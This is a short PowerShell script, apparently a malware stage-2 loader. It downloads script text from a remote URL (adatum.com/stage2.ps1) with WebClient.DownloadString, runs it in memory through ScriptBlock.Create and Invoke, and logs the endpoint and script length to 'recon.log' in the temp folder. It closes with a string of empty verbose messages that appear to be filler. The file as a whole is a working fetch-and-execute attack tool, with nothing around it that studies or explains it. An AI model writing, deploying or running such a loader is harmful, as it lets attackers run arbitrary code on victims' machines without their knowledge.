[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://adatum.com/stage2.ps1",
    [string]$TracePath = "$env:TEMP\recon.log",
    [int]$RequestTimeout = 96
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 96
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $RemoteScript = Get-StageScriptText -SourceUrl $RemoteUrl -TimeoutSec $RequestTimeout
    $TransferResult = Invoke-Stage2Script -ScriptBody $RemoteScript
    Write-Verbose "Stage result: $($TransferResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $RemoteUrl
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Collecting host metadata"
Write-Verbose "Preparing working directory"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
